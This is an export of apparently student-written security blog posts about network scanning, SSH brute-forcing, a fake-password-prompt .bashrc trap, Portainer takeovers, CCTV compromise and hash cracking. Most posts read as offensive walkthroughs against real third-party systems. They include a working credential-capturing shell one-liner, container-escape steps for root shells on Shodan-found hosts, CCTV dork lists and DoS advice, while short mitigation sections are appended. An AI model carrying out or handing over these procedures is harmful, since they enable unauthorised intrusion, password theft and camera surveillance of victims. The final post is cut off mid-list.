[{"content":"SSH Services at IIT Kanpur IIT Kanpur\u0026rsquo;s network uses Class B private IP addresses. Within this private network, students, faculty and staff can SSH into various servers using their Computer Center credentials to access different services. Examples of such servers include the GPU server, APP server, and MATH server.\nEach user has a 2GB directory on the Computer Center\u0026rsquo;s NFS (Network File System), which is mounted on all servers. This allows users to access their files across multiple servers without needing to copy them to each one, reducing the need for additional storage on individual servers. Port Scan of whole Private Network I couldn’t find a complete list of servers supporting SSH authentication with our Computer Center credentials and was eager to discover all the servers users could SSH into.\nSo, I conducted a port scan of IIT Kanpur\u0026rsquo;s entire private network for port 22 (SSH) using Gill-Singh-A/Port-Scanner and identified around 4,000 devices with the port open. Brute Forcing SSH Servers The next task was to identify the servers where we could authenticate using our Computer Center credentials.\nTo accomplish this, I used the tool Gill-Singh-A/SSH-Brute-Force\nAfter getting the Results, I got some interesting results.\nLinux Lab IPs I discovered 110 consecutive IP addresses, and upon gathering more information, I learned that these belonged to the Computer Center\u0026rsquo;s Linux Lab 2 and 3.\nUsers currently logged in the Computer After that, I accessed the computer using my user ID via SSH. To check the currently logged-in users, I entered the command who\nThis command allowed me to see both users logged in through SSH (indicated by their IP addresses) and those who were logged in offline (identified by the DISPLAY index, which starts with :) with their login time.\nBuilding the Heat Map After identifying the users on specific computers in Computer Center Linux Lab 2 and 3, it was time to create the heat map.\nI compiled a CSV file containing the IP addresses and locations of the computers, then developed a Python program to automate the process of checking user activity on each machine and display the results.\nThe program presents the results on the user\u0026rsquo;s IITK Homepage that was used in the program.\nResults The Final Python Program used to create the Heat Map for Linux Computer Labs at IIT Kanpur is Gill-Singh-A/IITK-Heat-Map\nIt displays the results on My Student Homepage for the following Labs:\nComputer Center Linux Labs NCL Linux Lab In my opinion, this tool is particularly useful for students during exams, as it helps save time by allowing them to see in advance if a computer lab is full before heading there.\n","date":"2024-09-24T04:24:41+05:30","image":"http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_webhome_hu3298137825559411538.png","permalink":"http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/","title":"Building a Heat Map for IIT Kanpur's Computer Labs"},{"content":"Prologue While exploring devices on my college network, I managed to gain Remote Desktop Access to a server for one of our institute\u0026rsquo;s websites. The method I used to obtain access to the interface is out of the scope of this blog.\nUpon gaining access, I found that the server was running Ubuntu. The terminal displayed user as the current user.\nI added my public key to /home/user/.ssh/authorized_keys and checked the SSH connection.\nWith SSH access confirmed, it was time to escalate our privileges to the root user.\nPrivilege Escalation Initially, I explored various SUIDs, SGIDs, Cronjob Files, the Shadow File, shared libraries, and other system components to find potential vulnerabilities. After finding no useful exploits, I downloaded and executed linPEAS to search for additional attack surfaces, but it was not successful.\nSocial Engineering \u0026ldquo;I\u0026rsquo;M GOOD AT READING PEOPLE. MY SECRET. I LOOK FOR THE WORST IN THEM.\u0026rdquo; - Mr.Robot\nThis line from Mr. Robot inspired me after my initial methods for privilege escalation failed.\nI devised a strategy to obtain the password for user using a social engineering approach.\nI created a single-line bash script to be appended to /home/user/.bashrc.\n1 echo -n \u0026#39;password for user: \u0026#39;; read -s password; echo -n $password | base64 \u0026gt;/tmp/tmp.txt; grep -v \u0026#39;random_signature\u0026#39; /home/user/.bashrc \u0026gt;/tmp/tmp; mv /tmp/tmp /home/user/.bashrc; chmod 644 ~/.bashrc; echo \u0026#39;\u0026#39;; Let\u0026rsquo;s Understand this command-by-command\nPrints password for user: on the screen, tricking the user into thinking it’s a prompt for their password. 1 echo -n \u0026#39;password for user: \u0026#39; Inputs the password in silent mode, so it doesn’t appear on the screen. 1 read -s password Encodes the password in base64 and saves it to /tmp/tmp.txt. 1 echo -n $password | base64 \u0026gt;/tmp/tmp.txt Removes lines containing random_signature from /home/user/.bashrc, ensuring it doesn’t affect the file’s functionality. 1 grep -v \u0026#39;random_signature\u0026#39; /home/user/.bashrc \u0026gt;/tmp/tmp Replaces the original .bashrc file with the modified version. 1 mv /tmp/tmp /home/user/.bashrc Restores the original file permissions for .bashrc 1 chmod 644 ~/.bashrc After appending this line to /home/user/.bashrc, every time a new terminal was opened, it would prompt the user for their password.\nOnce the user entered their password, the line would be removed from .bashrc, restoring the file to its original state. I could then SSH into the machine and retrieve the base64 encoded password from /tmp/tmp.txt.\nAlthough there were concerns about potential failures, such as entering the wrong password or pressing CTRL+C, the method worked successfully after a few days.\nObtaining Password A few days later, I logged in as user via SSH and found that it wasn’t prompting for a password. I checked /tmp/tmp.txt and found the base64 encoded password.\nAfter Decoding it, I obtained the password.\nFinally, I verified the success of my social engineering method by checking for root access.\nThere We have the root user!\nReporting As a responsible and ethical individual, I reported the findings to the concerned authorities. They have since addressed and fixed the issues discussed.\nMitigations Social Engineering remains one of the most dangerous methods of compromising security because it exploits human psychology rather than technical vulnerabilities. The weakest link in any security system is often the human element. Even the most secure systems can be breached if someone is tricked into revealing sensitive information or executing malicious commands.\nTo mitigate the risk of social engineering attacks:\nSecurity Awareness Training: Regularly train employees to recognize and respond to social engineering tactics. Verification Procedures: Implement strict verification processes for sensitive actions or information requests. Multi-Factor Authentication (MFA): Use MFA to add an extra layer of security beyond just passwords. Monitor and Audit: Regularly monitor and audit access logs for suspicious activity. By addressing these areas, you can significantly reduce the risk posed by social engineering and other similar attacks.\n","date":"2024-09-23T05:28:07+05:30","image":"http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt_hu6689578018464371638.png","permalink":"http://localhost:1313/p/using-social-engineering-for-privilege-escalation/","title":"Using Social Engineering for Privilege Escalation"},{"content":"Portainer Portainer is an open-source management tool designed for containers. It offers a user-friendly, lightweight web interface that simplifies the deployment and management of Docker environments. It\u0026rsquo;s important to note that while Portainer itself does not run with root privileges, if the Docker service managed by Portainer operates with root permissions, it could potentially lead to a remote root shell vulnerability, as discussed further.\nInformation Gathering Collecting Target Devices We\u0026rsquo;ll use Shodan Search Engine to Collect Target Devices.\nOn Shodan Search Engine search with query product:portainer, this would list out all the Devices that were identified running Portainer by Shodan.\nAfter setting the requeired filters, we can download the results.\nThe Number of Results that can be downloaded depends upon your query credits available(1 Query Credit = 100 Results)\nAfter Shodan has done compiling the data, it sends us a Mail that Data is ready for Download or we can alernatively wait on Shodan Download Page while the data is being compiled\nThe Download will be in the format .json.gz. Shodan provides a Command-Line Utility to Parse the data in these download files.\nThe utility can be installed with the command\n1 pip install shodan The Targets from the downloaded file can be extracted with the following command\n1 shodan parse --fields ip_str,port --separator : {file_name}.json.gz To save the Targets to a file, simply redirect the output of the command\n1 shodan parse --fields ip_str,port --separator : {file_name}.json.gz \u0026gt; {file_name_to_save_targets_to} I sometimes manually filterout some IPs by running a port scan, because sometimes the information provided by Shodan for some Devices is outdated.\nCompiling a suitable Wordlist for Brute-Force We can search for various Default/Weak Credentials Online. One of the best Repositories that I find for collecting Passwords for Brute-Force is SecLists.\nHere, I won\u0026rsquo;t disclose more information about the wordlists that I use.\nBrute Force To access the Portainer Dashboard, we first have to find correct credentials.\nAfter collecting Target Devices and Passwords, we\u0026rsquo;re ready to do a Brute-Force attack on the Portainer Web Interface.\nI use Gill-Singh-A, it is a Program written in Python that uses requests to brute force the Web Interface of Portainer through /api/auth endpoint and multithreading module to parallelize the brute force tasks. I\u0026rsquo;ve attached a small example of brute force in the following picture.\nGetting Remote Root Shell Now after getting access to the Portainer Web Interface, our job is to get a Remote Root Shell.\nFirst, we have to go to Images and find any Linux OS Image. Here in this example we see ubuntu:latest\nNext, we go to containers and click on Add Container\nWe name the Container as health_test :) and pull the Linux OS Image, in this case ubuntu:latest\nIn the command and Logging Section, we select Interactive and TTY Console.\nNext we go to Volume, Click on Map Additional Volume, Click on Bind and select /host in container and / in host. This way we\u0026rsquo;ve mounted the Host Root Directory into the Docker Container and we\u0026rsquo;ll use this to get the Remote Root Shell in the upcoming setups\nNext in Runtime \u0026amp; Resources turn Privilege Mode on.\nNext in Capabilities, turn every Linux Capability on to ensure smooth operation.\nThen Click on Deploy The Container.\nWe can see our Container health_test running.\nThen we click on exec console and in the Container Console connect to /bin/bash as root user.\nHere, we\u0026rsquo;ve run the bash as root user in the Container\nWe type the command ps aux and see bash Process with PID 1, this tells us that currently we\u0026rsquo;re inside the Container.\nThen to break out of the Container, we change our directory to /host and chroot into it and to confirm that We\u0026rsquo;ve successfully broken out of the container, we type ps aux and see that systemd has PID 1. Which confirms that we\u0026rsquo;ve broken out of the Container into the Host Machine\nThe chroot command usage is to change root directory to the supplied directory for the current running process and its children, so when we ran chroot in the /host directory where the Host was mounted, then it changed the root directory to host and hence broke out of the docker container.\nNext we check that we can login as root via ssh using the following command\n1 cat /etc/ssh/sshd_config | grep Root If not then we set it to yes.\nNext we generate a Public-Private Key Pair with the following command on our machine\n1 ssh-keygen -t rsa -b 4096 -C root Then paste the Public Key File to the /root/.ssh/authorized_keys of the Target Machine.\nAfter all this, now we\u0026rsquo;ll be able to ssh to the Target Machine with root user.\nWe can further more Geolocate the IP Addresses using Gill-Singh-A/IP-Location to get an approximate location of the Devices (although it may not always be correct)\nWe can use the Compromised Devices for Cluster Computing after gaining basic information about their Processing Power, Memory, Space, etc\nMitigations In this blog we saw that how easy it was to gain remote root access to a Device that was using misconfigured Portainer Web Interface (exposed to internet, using weak credentials) in several ways.\nTo avoid getting your Device compromised, you should take the following steps:\nMake sure that Portainer Interface is not exposed to the Internet Not using Default/Weak Credentials Setting up Proper Firewall Rules Keeping the Software/Firmware up to date, to avoid any CVEs present in the device that could be exploited Note The Above mentioned points doesn\u0026rsquo;t Guarantee 100% protection, they only enhance the security\nChecking Leaked Passwords There are several websites you can use to check whether the password that you\u0026rsquo;re using has been leaked somewhere online or not. Here are some popular ones:\nHave I Been Pwned: Check if your email or phone is in a data breach Dehashed: Free deep-web scans and protection against credential leaks LeakCheck.io: Make sure your credentials haven\u0026rsquo;t been compromised crackstation.net: Massive pre-computed lookup tables to crack password hashes HashKiller: Pre-cracked Hashes, easily searchable LeakedPassword: Search across multiple data breaches to see if your pass has been compromised BugMeNot: Find and share logins Source: edoardottt/awesome-hacker-search-engines\n","date":"2024-09-23T05:21:38+05:30","image":"http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/main_image_hu882342580633118504.png","permalink":"http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/","title":"Getting Remote Root Shell on Devices via Portainer"},{"content":"Compromising CCTVs 101 RTSP Protocol RTSP Protocol stands for Real Time Streaming Protocol and by default runs on Port 554. As the name tells, its an application level protocol designed to transport streams over a network and is commonly used by Devices like CCTVs. The RTSP Protocol doesn\u0026rsquo;t offer encryption, therefore everything is transparent to an Attacker eavesdropping on the Network Traffic of a Device using RTSP. We won\u0026rsquo;t cover MITM (Man-in-the-Middle) Attacks and other eavesdropping methods in this blogs, rather will focus on gaining direct access to CCTVs.\nInformation Gathering Collecting IP Addresses of CCTVs There are several ways of collecting IP Addresses of CCTVs, We\u0026rsquo;ll cover the most common ones:\nShodan Google Dorking Port Scanning Shodan On Shodan Search Engine, search with query port:554 RTSP. This would list out all the Devices that have Port 554 Open found by Shodan with RTSP in their banner. Most of them will be CCTVs. We can even filter out more on various basis, for example location (country, city, etc)\nOr if we want to find CCTVs that have no authentication, we can provide the filter has_screenshot:true.\nAfter setting the requeired filters, we can download the results.\nThe Number of Results that can be downloaded depends upon your query credits available(1 Query Credit = 100 Results)\nAfter Shodan has done compiling the data, it sends us a Mail that Data is ready for Download or we can alernatively wait on Shodan Download Page while the data is being compiled\nThe Download will be in the format .json.gz. Shodan provides a Command-Line Utility to Parse the data in these download files.\nThe utility can be installed with the command\n1 pip install shodan The IP Addresses from the downloaded file can be extracted with the following command\n1 shodan parse --fields ip_str {file_name}.json.gz To save the IP Addresses to a file, simply redirect the output of the command\n1 shodan parse --fields ip_str {file_name}.json.gz \u0026gt; {file_name_to_save_ip_addresses_to} I sometimes manually filterout some IPs by running a port scan, because sometimes the information provided by Shodan for some Devices is outdated.\nGoogle Dorking Here is the Google Dorks that I use for finding CCTVs\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 inurl:\u0026#34;view/index.shtml\u0026#34; inurl:\u0026#34;MultiCameraFrame?Mode=Motion\u0026#34; VB Viewer inurl:/viewer/live/ja/live.html intitle:\u0026#34;IP CAMERA Viewer\u0026#34; intext:\u0026#34;setting | Client setting\u0026#34; intitle:\u0026#34;Device(\u0026#34; AND intext:\u0026#34;Network Camera\u0026#34; AND \u0026#34;language:\u0026#34; AND \u0026#34;Password\u0026#34; intitle:\u0026#34;webcam 7\u0026#34; inurl:\u0026#39;/gallery.html\u0026#39; intitle:\u0026#34;Yawcam\u0026#34; inurl:8081 inurl:control/camerainfo intitle:\u0026#34;webcamXP 5\u0026#34; -download inurl:\u0026#34;/view/view.shtml?id=\u0026#34; inurl:/view/viewer_index.shtml intext:\u0026#34;powered by webcamXP 5\u0026#34; intitle:webcam 7 inurl:8080 -intext:8080 intitle:\u0026#34;Live View / - AXIS\u0026#34; | inurl:view/view.shtml OR inurl:view/indexFrame.shtml | intitle:\u0026#34;MJPG Live Demo\u0026#34; | \u0026#34;intext:Select preset position\u0026#34; allintitle: Axis 2.10 OR 2.12 OR 2.30 OR 2.31 OR 2.32 OR 2.33 OR 2.34 OR 2.40 OR 2.42 OR 2.43 \u0026#34;Network Camera\u0026#34; allintitle:Edr1680 remote viewer allintitle: EverFocus | EDSR | EDSE400 Applet allintitle: EDR1600 login | Welcome intitle:\u0026#34;BlueNet Video Viewer\u0026#34; intitle:\u0026#34;SNC-RZ30\u0026#34; -demo inurl:cgi-bin/guestimage.html (intitle:(EyeSpyFX|OptiCamFX)) \u0026#34;go to camera\u0026#34;)|(inurl:servlet/DetectBrowser) intitle:\u0026#34;Veo Observer XT\u0026#34; - inurl:shtml|pl|php|htm|asp|aspx|pdf|cfm - intext:observer intitle:\u0026#34;iGuard Fingerprint Security System\u0026#34; (intitle:MOBOTIX intitle:PDAS) | (intitle:MOBOTX intitle:Seiten) | (inurl:/pda/index.html +camera) intitle:\u0026#34;Edr1680 remote viewer\u0026#34; intitle:\u0026#34;NetCam Live Image\u0026#34; -.edu -.gov -johnny.ihackstuff.com intitle:\u0026#34;INTELLINET\u0026#34; intitle:\u0026#34;IP Camera Homepage\u0026#34; intitle:\u0026#34;WEBDVR\u0026#34; -inurl:product -inurl:demo intitle:\u0026#34;Middle frame of Videoconference Management System\u0026#34; ext:htm tilt intitle:\u0026#34;Live View / - AXIS\u0026#34; | inurl:view/view.shtml intitle:\u0026#34;AXIS 240 Camera Server\u0026#34; intext:\u0026#34;server push\u0026#34; -help intitle:\u0026#34;--- VIDEO WEB SERVER ---\u0026#34; intext:\u0026#34;Video Web Server\u0026#34; \u0026#34;Any time \u0026amp; Any where\u0026#34; username password intitle:HomeSeer.Web.Control | Home.Status.Events.Log inurl:camctrl.cgi intitle:\u0026#34;supervisioncam protocol\u0026#34; intitle\u0026#34;active webcame page\u0026#34; We won\u0026rsquo;t cover much of the dorking part, because it is painful to extract the links from a google search queries and the other 2 mentioned methods work well for our purporse.\nPort Scanning Instead of using Shodan for getting Devices with a open port, we can manually scan for open ports. This is the method that should be opted for collecting IP Addresses of CCTVs on a Local/Corporate Network. We can use Port Scanning tools like nmap, unicornscan, etc. For scanning a Large Subdomain/Large Number of Devices I\u0026rsquo;d prefer using unicornscan tool, because it sends all the SYN Packets without waiting for responses and starts a sniffer which looks for SYN-ACK Packets to determine which Device has an open port, making it faster than nmap.\nIn the following example of port scan, I\u0026rsquo;ve used Gill-Singh-A/Port-Scanner. In this repository port_scanner.py sends the SYN Packet, waits for the SYN-ACK Packets and then completes the TCP Handshake by sending the ACK Packet and finally closes the connection by sending FIN Packet making it a slow scanner. The scapy_port_scanner.py (used in the following example) is somewhat based on the unicornscan tool and is faster than port_scanner.py.\nCompiling a suitable Wordlist for Brute-Force We can make a wordlist by looking for Default Credentials for various CCTV Vendors, Weak Credentials and credentials present in SecLists.\nHere, I won’t disclose more information about the wordlists that I use.\nBrute Force After Collecting the IP Address, Port and Credentials, we\u0026rsquo;re ready to do a Brute-Force attack on the Devices.\nI use Gill-Singh-A/RTSP-Brute-Force, it is a Program written in python that uses OpenCV to brute force the CCTVs and uses multithreading module to parallelize the brute force tasks. We can also redirect the Error output by OpenCv by using the error redirected to Null 2\u0026gt;/dev/null at the end of the command.\nHere in the following exampe, I\u0026rsquo;ve run the program and also opened the Stream in VLC Media Player of the CCTV that it gained access to.\nWe can further more Geolocate the IP Addresses using Gill-Singh-A/IP-Location to get an approximate location of the Devices (although it may not always be correct)\nWe can now even open the Admin Panel of the CCTV using the Browser and can manipulate crucial settings, backup storage and more. DOS We can also do a DOS (Denial-of-Service) attack on the CCTV Device to interrupt the live stream. We can use various tools to do a DOS Attack like Gill-Singh-A/SYN-Flood-Attack, GoldenEye, etc\nBut I prefer using the hping tool to do SYN Flood Attack because its more effective. Mitigations In this blog we saw that how easy it was to gain access to a CCTV that was misconfigured (exposed to internet, using weak credentials) in several ways.\nTo avoid getting your CCTV Device compromised, you should take the following steps:\nMake sure that a CCTV Device on your Local Network is not exposed to the Internet Not using Default/Weak Credentials Setting up Proper Firewall Rules Keeping the Software/Firmware up to date, to avoid any CVEs present in the device that could be exploited Note The Above mentioned points doesn\u0026rsquo;t Guarantee 100% protection, they only enhance the security\nChecking Leaked Passwords There are several websites you can use to check whether the password that you\u0026rsquo;re using has been leaked somewhere online or not. Here are some popular ones:\nHave I Been Pwned: Check if your email or phone is in a data breach Dehashed: Free deep-web scans and protection against credential leaks LeakCheck.io: Make sure your credentials haven\u0026rsquo;t been compromised crackstation.net: Massive pre-computed lookup tables to crack password hashes HashKiller: Pre-cracked Hashes, easily searchable LeakedPassword: Search across multiple data breaches to see if your pass has been compromised BugMeNot: Find and share logins Source: edoardottt/awesome-hacker-search-engines\n","date":"2024-09-23T05:13:06+05:30","image":"http://localhost:1313/p/compromising-cctvs-101/assets/images/main_image_hu2071864192197958181.png","permalink":"http://localhost:1313/p/compromising-cctvs-101/","title":"Compromising CCTVs 101"},{"content":"How passwords are stored on servers? Passwords are stored on databases by hashing them alone or after appending them with random values. Hashing is a one-way function that converts a given string of characters into another value. A strong hashing algorithm has to be quick, deterministic, and irreversible. In this blog, we explore how a hashed password can be cracked.\nHashing Algorithms Hashing algorithms are mathematical functions that take an input (often a string of characters, such as a password) and produce a fixed-size string of characters, known as a hash value or hash code. These algorithms are designed to be one-way functions, meaning that while it\u0026rsquo;s easy to compute the hash value from the input (password), it\u0026rsquo;s computationally infeasible to reverse the process and obtain the original input from the hash value.\nSome common hashing Algorithms are:\nmd5: A widely-used cryptographic hash function producing a 128-bit (16-byte) hash value sha1: A cryptographic hash function designed by the NSA, producing a 160-bit (20-byte) hash value. sha224: A variant of SHA-2 family generating a 224-bit (28-byte) hash value. sha256: Part of the SHA-2 family, producing a 256-bit (32-byte) hash value. sha384: A SHA-2 algorithm variant producing a 384-bit (48-byte) hash value. sha3_224: One of the SHA-3 family hash functions generating a 224-bit (28-byte) hash value. sha3_256: Part of the SHA-3 family producing a 256-bit (32-byte) hash value. sha3_384: A SHA-3 algorithm variant generating a 384-bit (48-byte) hash value. sha3_512: A SHA-3 family hash function producing a 512-bit (64-byte) hash value. sha512: A SHA-2 algorithm variant generating a 512-bit (64-byte) hash value. BLAKE2: A cryptographic hash function offering high speed and security, available in different output sizes Whirlpool: A cryptographic hash function producing a 512-bit (64-byte) hash value, designed by Vincent Rijmen and Paulo S. L. M. Barreto RIPEMD-160: A cryptographic hash function developed as an improvement of RIPEMD, producing a 160-bit (20-byte) hash value Tiger: A cryptographic hash function known for its speed and cryptographic strength, producing a 192-bit (24-byte) hash value Why Passwords are Hashed Passwords are hashed primarily for security reasons. When a user creates an account or sets a password, the system does not store it. Instead, it computes the password\u0026rsquo;s hash value using a hashing algorithm and stores the hash value in its database.\nHere are the main reasons why passwords are hashed:\nProtection Against Data Breaches: Hidden passwords thwart attackers User Privacy: Shield passwords from unauthorized access Preventing Password Reuse: Encourage unique passwords Compliance with Security Standards: PCI DSS, GDPR, and other standards mandate password hashing for user data protection Salting in Hashes Salting in hashes is a technique used to enhance the security of hashed passwords or data by adding a random or unique value, called a salt, before hashing. This salt is typically a random string of characters or bits generated separately for each password or piece of data being hashed. Here\u0026rsquo;s an explanation of how salting works and why it\u0026rsquo;s important:\nAdding Randomness: Salting introduces randomness by appending a unique value to each password before hashing Preventing Precomputed Attacks: Salting thwarts precomputed attacks like rainbow tables(explained later) by ensuring each password has a distinct hash Enhancing Security: Salting significantly boosts security by mitigating various types of attacks, including brute force and dictionary attacks Password Protected Files and Drives Password-protected files, such as ZIP archives and PDF documents, are digital files encrypted with a password to prevent unauthorized access. ZIP files, compressed archives containing multiple files and folders, can be password-protected to encrypt their contents, requiring the correct password for extraction. Similarly, PDF files, commonly used for document sharing, can be secured with password protection to encrypt the document\u0026rsquo;s contents and restrict access or actions like printing and editing without the correct password. Encrypted files and drives use encryption algorithms to encode data, making it unreadable without the corresponding decryption key or password. This encryption ensures the confidentiality and security of sensitive information stored within the files or drives, reinforcing protection against unauthorized access and data breaches.\nHash Cracking In this section we explore the ways we can decipher a hashed password.\nMethods of Password Cracking There are 4 methods to crack a Hash Protected Password\nBrute Force In a brute force attack, the attacker systematically tries every possible combination of characters until the correct password is found This method starts with trying the simplest passwords, such as single characters or common words, and gradually progresses to more complex combinations Brute force attacks can be resource-intensive and time-consuming, especially for longer and more complex passwords, but they are generally effective against weak passwords Dictionary Attack A dictionary attack involves using a predefined list of words, phrases, or commonly used passwords to guess the password Unlike brute force, which tries every possible combination, a dictionary attack focuses on likely passwords first, potentially speeding up the process The dictionary used in this attack may include common words, phrases, names, and variations thereof, making it more efficient than brute force for many scenarios Rainbow Table Attack Rainbow table attacks exploit weaknesses in password storage mechanisms, particularly when passwords are hashed without salting A rainbow table is a precomputed table of password hashes and their corresponding plaintext passwords Instead of recalculating hashes for each attempted password, the attacker compares the hash of the target password with entries in the rainbow table to find a match This method can be faster than brute force or dictionary attacks, especially for large datasets, but it requires significant computational resources to generate and store the rainbow table initially Collision Attack A collision attack is a type of cryptographic attack where an attacker tries to find two different inputs (messages) that produce the same hash value when processed by a hashing algorithm. In other words, the attacker seeks to find a collision—a situation where two distinct inputs generate identical hash outputs. Collision attacks can have serious security implications, especially in cryptographic systems where hash functions are used for ensuring data integrity, authentication, and other security purposes. A successful collision attack undermines the fundamental security properties of the hash function, leading to potential vulnerabilities and compromises in the overall security of the system. Collision Attack Proof of Concept Collision attacks against MD5 are not only theoretically possible but have also been demonstrated in practice. In fact, MD5 is considered highly vulnerable to collision attacks due to its design flaws and weaknesses. In 2004, researchers Xiaoyun Wang and Hongbo Yu published a paper titled Collisions for Hash Functions MD4, MD5, HAVAL-128 and RIPEMD where they presented practical collision attacks against several cryptographic hash functions, including MD5. They demonstrated that it was possible to find two different inputs that produce the same MD5 hash value, effectively breaking the collision resistance property of MD5. Since then, further advancements in computing power and cryptanalysis techniques have made collision attacks against MD5 even more feasible and practical. Today, it is relatively easy to generate MD5 collisions using specialized hardware or distributed computing resources. Due to these vulnerabilities, MD5 is no longer considered secure for cryptographic purposes, and its use has been strongly discouraged in favor of more secure hashing algorithms such as SHA-256 or SHA-3. In fact, most modern security standards and protocols explicitly prohibit the use of MD5 due to its susceptibility to collision attacks.\nTools for Hash Cracking Hashcat: A highly versatile and powerful password recovery tool that supports various hashing algorithms and attack modes, including brute force, dictionary, and mask attacks John the Ripper: One of the oldest and most widely used password cracking tools, capable of performing dictionary and brute force attacks against various password hashes. Ophcrack: A free and open-source tool primarily used for cracking Windows passwords by leveraging rainbow tables for LM and NTLM hashes. Medusa: A parallel login brute-forcer that supports various protocols, including SSH, FTP, Telnet, HTTP(S), SMB, and others. Hydra: A network login cracker that supports various protocols like SSH, FTP, Telnet, HTTP(S), and others, making it useful for cracking passwords on network services. Cain and Abel: A versatile password recovery tool that can recover passwords using various methods such as dictionary attacks, brute-force attacks, and cryptanalysis attacks. RainbowCrack: A password cracking tool that uses rainbow tables to crack hashes. It can handle various hash algorithms and supports distributed cracking. Aircrack-ng: A popular tool for cracking Wi-Fi passwords by capturing and analyzing network packets, supporting various encryption algorithms like WEP and WPA/WPA2. HashcatGUI: A graphical user interface for Hashcat, providing an easier and more user-friendly way to perform hash cracking tasks. Pyrit: Another tool for cracking Wi-Fi passwords, Pyrit specializes in attacking WPA/WPA2-PSK authentication. fcrackzip: fcrackzip is a fast password cracker partly written in assembler. It is able to crack password protected zip files with brute force or dictionary based attacks, optionally testing with unzip its results. It can also crack cpmask’ed images. Websites for Hash Cracking OnlineHashCrack Crack Station Hashes.com MD5 Hashing Ntirxgen Wordlists Most of the time Wordlists that contain commonly used passwords and words are used for this puspose. Wordlists like this typically originate from data breaches, leaks, or public disclosures of passwords used by individuals on various online platforms. Several famous wordlists are widely used in password cracking, security testing, and research. Here are some of the most notable ones:\nRockYou: One of the largest and most well-known wordlists, containing millions of commonly used passwords leaked from the RockYou data breach in 2009. SecLists: A collection of multiple wordlists curated and maintained by Daniel Miessler and Jason Haddix, covering various categories such as passwords, usernames, web shells, and more. Probable Wordlists: Wordlists generated by combining common words, names, dates, and patterns likely to be used in passwords, often used in conjunction with brute force and dictionary attacks. CrackStation: A collection of wordlists generated from leaked password databases, providing a comprehensive dataset for password cracking purposes. Hashes.org: An online repository of hashed passwords and associated wordlists, allowing researchers and security professionals to collaborate on password cracking projects. WPA/WPA2 Wordlists: Specialized wordlists containing common passwords and phrases used in Wi-Fi networks protected by WPA/WPA2 encryption, often used for cracking wireless network passwords. More Lists of Wordlists can be found on WeakPass\nCustom Wordlists Several tools are available for generating wordlists, which are essential for password cracking and security testing. Here are some popular ones:\nCrunch: A powerful wordlist generator that allows users to specify custom character sets, lengths, and patterns for generating wordlists. CUPP (Common User Passwords Profiler): A simple tool that generates custom wordlists based on personal information such as names, dates, and common passwords. CeWL (Custom Word List generator): A tool that spiders a target website to create custom wordlists based on the content found in the web pages. CPU vs GPU The choice between using CPU (Central Processing Unit) and GPU (Graphics Processing Unit) for hash cracking can significantly impact the speed and efficiency of the cracking process.\nCPU Hash Cracking CPUs are general-purpose processors designed to handle a wide range of tasks, including hash cracking While CPUs can execute a variety of instructions, they typically have a limited number of processing cores compared to GPUs Hash cracking on CPU relies heavily on the CPU\u0026rsquo;s processing power and its ability to handle sequential tasks efficiently CPUs are well-suited for tasks that require complex logic, branching, and sequential processing, which are often found in password cracking algorithms However, CPU hash cracking tends to be slower compared to GPU cracking, especially when dealing with large datasets or complex hashing algorithms GPU Hash Cracking GPUs are highly parallelized processors designed to handle large amounts of data simultaneously, making them well-suited for hash cracking. Modern GPUs contain thousands of cores optimized for parallel processing, allowing them to perform many calculations simultaneously Hash cracking on GPU can leverage the massive parallel processing power of GPUs to accelerate the cracking process significantly GPUs are particularly effective at tasks that involve simple, repetitive calculations, such as those commonly encountered in cryptographic algorithms used for hashing As a result, GPU hash cracking can achieve much higher speeds compared to CPU cracking, especially for algorithms that can be easily parallelized Types of Passwords It is also possible to classify passwords into certain sets. These sets can make the password cracking process more efficient, especially if we have some information about the targetted individual or group of individuals.\nHere are a few sets:\nDictionary Password These passwords are derived from words found in dictionaries. Attackers often use dictionary-based attacks where they try common words or phrases as passwords. Example: \u0026ldquo;sunshine\u0026rdquo;, \u0026ldquo;password123\u0026rdquo;, \u0026ldquo;football\u0026rdquo; Short Set Short sets are passwords that consist of a small number of characters or digits. These passwords are relatively easier to guess or crack through brute force methods compared to longer, more complex passwords. Example: \u0026ldquo;1234\u0026rdquo;, \u0026ldquo;abcd\u0026rdquo;, \u0026ldquo;qwerty\u0026rdquo; Keywalk Keywalk passwords involve selecting characters that are adjacent to each other on a keyboard layout. Users may choose this method thinking it\u0026rsquo;s easy to remember, but it can be insecure due to its predictability. Example: \u0026ldquo;qwertyuiop\u0026rdquo;, \u0026ldquo;asdfghjkl\u0026rdquo;, \u0026ldquo;zxcvbnm\u0026rdquo; Personal Data These passwords incorporate personal information such as names, birthdates, addresses, or other identifiable information. While easy to remember, they are often easy to guess by someone who knows the individual well or can gather information about them. This type of password can be easily generated with CUPP. Example: \u0026ldquo;John1985NY\u0026rdquo;, \u0026ldquo;SarahSmith1234\u0026rdquo;, \u0026ldquo;London33\u0026rdquo; Distortion of Specific Words This method involves taking a common word or phrase and intentionally misspelling or distorting it in some way to create a password. While it may seem secure, attackers can still use techniques like dictionary attacks to crack them. Example: \u0026ldquo;P@$$w0rd\u0026rdquo; (instead of \u0026ldquo;Password\u0026rdquo;), \u0026ldquo;L0v3ly\u0026rdquo; (instead of \u0026ldquo;Lovely\u0026rdquo;), \u0026ldquo;S3cur!ty\u0026rdquo; (instead of \u0026ldquo;Security\u0026rdquo;) Repetitive Patterns These passwords involve repeating a pattern of characters, numbers, or symbols. While they may seem complex at first, they can be easily cracked through pattern recognition. Example: \u0026ldquo;123123\u0026rdquo;, \u0026ldquo;abcabc\u0026rdquo;, \u0026ldquo;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026rdquo; Sequential Characters Sequential character passwords involve using characters that appear in sequence in the alphabet or somewhere else. These passwords are often weak due to their predictability. Example: \u0026ldquo;abcdef\u0026rdquo;, \u0026ldquo;123456\u0026rdquo; Common Phrases or Quotes Passwords are derived from well-known phrases, slogans, or quotes. While they may be easy to remember, they are also easier for attackers to guess through dictionary-based attacks. Example: \u0026ldquo;ToBeOrNotToBe\u0026rdquo;, \u0026ldquo;LiveLaughLove\u0026rdquo;, \u0026ldquo;AllYouNeedIsLove\u0026rdquo; Keyboard Walks (Non-linear) 